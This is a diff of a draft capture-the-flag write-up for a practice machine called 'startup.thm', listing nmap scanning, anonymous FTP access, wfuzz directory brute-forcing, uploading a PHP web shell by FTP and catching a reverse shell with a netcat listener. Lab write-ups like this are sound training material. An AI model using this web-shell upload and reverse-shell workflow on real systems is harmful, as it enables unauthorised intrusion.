@@ -16,12 +16,27 @@ ip add to hosts
 
 > sudo leafpad /etc/hosts
 
+  ```
+     ip   startup.thm
+  ```
+  
+> sudo nmap -sC -sV startup.thm
 
-> sudo nmap -sC -sV 
+<p align="left">
+<img src="/assets/img/startup/nmap.png" width="350"/>
+</p>
+
+FTP login with username is anonymous and password is anonymous 
+
+> ftp startup.thm
 
 <p align="center">
 <img src="/assets/img/startup/nmap.png" width="350"/>
 </p>
+
+> get 
+> 
+> get 
 
 wfuzz -w /usr/share/SecLists/discovery/Webcontents/raft-large-directories.txt -u http://startup.thm/FUZZ
 
@@ -29,18 +44,13 @@ wfuzz -w /usr/share/SecLists/discovery/Webcontents/raft-large-directories.txt -u
 <img src="/assets/img/startup/" width="350"/>
 </p>
 
-> ftp startup.thm
-> get 
-> get 
-
-
 phpshell.php
 
 > put phpshell.php
 
  Check the ip addr
  
-nc -lvnp 33456
+> nc -lvnp 33456
 
 > ls -la
 > stty raw -echo 
